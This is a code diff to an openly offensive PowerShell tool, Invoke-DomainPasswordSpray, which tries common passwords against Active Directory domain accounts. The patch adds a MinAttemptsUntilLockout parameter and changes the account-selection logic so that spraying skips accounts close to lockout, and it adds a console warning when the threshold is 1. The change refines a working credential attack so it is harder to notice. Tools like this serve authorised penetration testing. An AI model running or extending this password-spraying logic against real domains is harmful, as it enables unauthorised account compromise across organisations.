@@ -46,6 +46,10 @@ function Invoke-DomainPasswordSpray{
 
     For each user, will try that user's name as their password
 
+    .PARAMETER MinAttemptsUntilLockout
+
+    Limit password spraying to accounts with more than this number of attempts left until lockout. Default is 2 (if set to 1, a wrong attempt will lock the account!).
+
     .EXAMPLE
 
     C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
@@ -109,7 +113,10 @@ function Invoke-DomainPasswordSpray{
      $Delay=0,
 
      [Parameter(Position = 9, Mandatory = $false)]
-     $Jitter=0
+     $Jitter=0,
+
+     [Parameter(Position = 10, Mandatory = $false)]
+     $MinAttemptsUntilLockout = 2
 
     )
 
@@ -155,7 +162,7 @@ function Invoke-DomainPasswordSpray{
 
     if ($UserList -eq "")
     {
-        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter
+        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter -MinAttemptsUntilLockout $MinAttemptsUntilLockout 
     }
     else
     {
@@ -281,6 +288,10 @@ function Get-DomainUserList
 
     Custom LDAP filter for users, e.g. "(description=*admin*)"
 
+    .PARAMETER MinAttemptsUntilLockout
+
+    Limit password spraying to accounts with more than this number of attempts left until lockout. Default is 2 (if set to 1, a wrong attempt will lock the account!).
+
     .EXAMPLE
 
     PS C:\> Get-DomainUserList
@@ -313,8 +324,15 @@ function Get-DomainUserList
 
      [Parameter(Position = 3, Mandatory = $false)]
      [string]
-     $Filter
+     $Filter,
+
+     [Parameter(Position = 4, Mandatory = $false)]
+     $MinAttemptsUntilLockout = 2
     )
+
+    if($MinAttemptsUntilLockout -eq 1) {
+        Write-Host -ForegroundColor Red "[*] Warning! 'MinAttemptsUntilLockout' set to 1. This means the attack could target accounts which will be locked upon 1 bad attempt (the attempt you are about to perform)!"
+    }
 
     try
     {
@@ -455,7 +473,7 @@ function Get-DomainUserList
                 # if there is more than 1 attempt left before a user locks out
                 # or if the time since the last failed login is greater than the domain
                 # observation window add user to spray list
-                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
+                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -ge $MinAttemptsUntilLockout))
                                 {
                     $UserListArray += $samaccountname
                 }
